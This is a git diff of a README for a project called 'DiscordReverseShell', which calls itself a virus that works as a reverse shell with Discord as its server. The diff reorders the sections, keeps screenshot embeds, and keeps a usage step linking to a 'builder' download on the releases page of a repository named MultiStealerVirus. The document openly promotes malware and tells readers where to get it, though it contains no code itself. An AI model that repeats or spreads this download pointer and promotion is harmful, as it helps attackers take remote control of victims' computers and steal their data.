@@ -1,9 +1,7 @@
 # DiscordReverseShell
 Virus in style of reverse shell whit discord as server
 
-## Usage
-
-1. You dwonload buillder [here](https://github.com/Josakko/MultiStealerVirus/releases/).
+## Examples 
 
 <p align="center">
   <img alt="issue" src="https://github.com/Josakko/MultiStealerVirus/blob/main/img/img1.png?raw=true" width="600px">
@@ -21,6 +19,12 @@ Virus in style of reverse shell whit discord as server
 <p align="center">
   <img alt="issue" src="https://github.com/Josakko/MultiStealerVirus/blob/main/img/im3.png?raw=true" width="600px">
 </p>
+
+## Usage
+
+1. Download builder [here](https://github.com/Josakko/MultiStealerVirus/releases/).
+
+2. 
 
 ## Need Help?
 
